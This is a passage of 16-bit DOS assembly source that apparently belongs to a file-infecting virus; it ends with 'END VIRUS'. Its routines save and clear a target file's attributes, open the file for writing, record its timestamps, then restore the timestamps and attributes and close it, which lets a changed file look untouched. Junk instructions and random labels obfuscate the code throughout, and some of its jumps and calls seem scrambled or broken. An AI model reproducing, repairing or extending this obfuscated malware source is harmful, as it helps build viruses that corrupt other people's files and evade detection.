WUEMJ:
		JMP 	PJTZU
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
PJTZU:
	 mov ah,1AH
	 int 21H 
	 mov ax,cs 
JZ TXSJG
JMP FELRY
TXSJG:
		JMP 	AUUXC
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
AUUXC:
	 mov ds,ax
FQQDD:
		call 	 EURRR
QKCGB:
		call 	 ZRTZJ
FELRY:
		call 	 TXSJG
FMDLV:
		call 	 KBVPF
	 ret	 

SAVE_ATTRIBUTE:
		JMP 	MMZNC
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
MMZNC:
	 mov ah,43H 
		JMP 	FQQDD
EURRR:
		JMP 	TIZOQ
xor bx,cx
xor bx,cx
xor bx,cx
TIZOQ:
		JMP 	GDRSM
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
GDRSM:
		JMP 	ITIAG
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ITIAG:
	 mov al,0
JNZ ZRTZJ
JMP QKCGB
ZRTZJ:
		JMP 	CTWLE
nop
nop
nop
nop
nop
nop
nop
CTWLE:
	 mov dx,OFFSET USEFILE
		JMP 	FMDLV
KBVPF:
_ETSM:
	 int 21H
		JMP 	CVLZW
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
CVLZW:
	 mov [FATTR],cl 
YARPI:
		JMP 	_HQSG
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
_HQSG:
	 mov ah,43H
DSDDZ:
_RDMJ:
	 mov al,1
YFPDL:
	 mov dx,OFFSET USEFILE
VOCFY:
GV_PJ:
	 mov cl,0
	 int 21H
		JMP 	PQRJD
cmp ax,bx
PQRJD:
	 mov dx,OFFSET USEFILE
GFZCL:
	 mov al,2 
ERRUY:
	 mov ah,3DH 
F_FYY:
	 int 21H
	 mov [HANDLE],ax 
NKEWO:
		JMP 	NEHBN
nop
nop
nop
nop
nop
NEHBN:
	 mov ah,57H 
JGMII:
ODVIZ:
ZYM_U:
	 xor al,al
		JMP 	ZFDUD
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZFDUD:
		JMP 	OKXRV
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
OKXRV:
	 mov bx,[HANDLE]
KVHSY:
MOZZT:
JKUMO:
		JMP 	NBJVJ
AVTLC:
	 int 21H
	 mov [FTIME],cx 
IGTUF:
	 mov [FDATE],dx 
DMVQG:
XPLSO:
TSOGY:
	 mov ax,WORD PTR [DTA1+28] 
XGQXM:
BFGLT:
	 mov WORD PTR [FSIZE+2],ax 
WQQDZ:
		JMP 	TOXOE
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
TOXOE:
	 mov ax,WORD PTR [DTA1+26] 
FDSLX:
JZ NTLBL
JMP GB_LS
NTLBL:
		JMP 	OEMUT
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
OEMUT:
	 mov WORD PTR [FSIZE],ax
GB_LS:
		call 	 NTLBL
 	 ret

NBJVJ:
		call 	 AVTLC


REST_ATTRIBUTE:
		JMP 	VLQ_W
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
VLQ_W:
		JMP 	WK_YV
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
WK_YV:
		JMP 	QROES
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
QROES:
		JMP 	PQVXO
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
PQVXO:
	 mov dx,[FDATE] 
		JMP 	K_LET
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
K_LET:
	 mov cx,[FTIME]
DPRHR:
		JMP 	EABJZ
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
EABJZ:
	 mov ah,57H 
MMZKH:
CPIWN:
	 mov al,1
XAJNU:
_MZUS:
		JMP 	YRSIY
nop
nop
nop
nop
nop
nop
nop
nop
nop
YRSIY:
	 mov bx,[HANDLE]
IUILM:
	 int 21H
		JMP 	RASPR
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
RASPR:
	 mov ah,3EH
PMQRH:
		JMP 	LDAPY
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
LDAPY:
	 mov bx,[HANDLE]
ZBWCM:
JZ __NCX
JMP BJZLD
__NCX:
		JMP 	CTJNZ
IMKUF:
	 int 21H
		JMP 	VFY_V
nop
nop
nop
nop
VFY_V:
	 mov cl,[FATTR]
DXCSD:
BOXLV:
JNZ FZSKS
JMP Q_APO
FZSKS:
JZ NIKA_
JMP MZTVO
NIKA_:
	 xor ch,ch
	 mov ah,43H 
		JMP 	DLGQO
JUBQ_:
	 mov al,1
	 mov dx,OFFSET USEFILE
JZ V__FN
JMP MYIRW
V__FN:
	 int 21H
CTJNZ:
		call 	 IMKUF
BJZLD:
		call 	 __NCX
MZTVO:
		call 	 NIKA_
DLGQO:
		call 	 JUBQ_
Q_APO:
		call 	 FZSKS
MYIRW:
		call 	 V__FN
	 ret

FINAL: 

VSEG ENDS 	 

VSTACK SEGMENT PARA STACK
 	   db STACKSIZE dup (?)
VSTACK ENDS
	   END VIRUS 
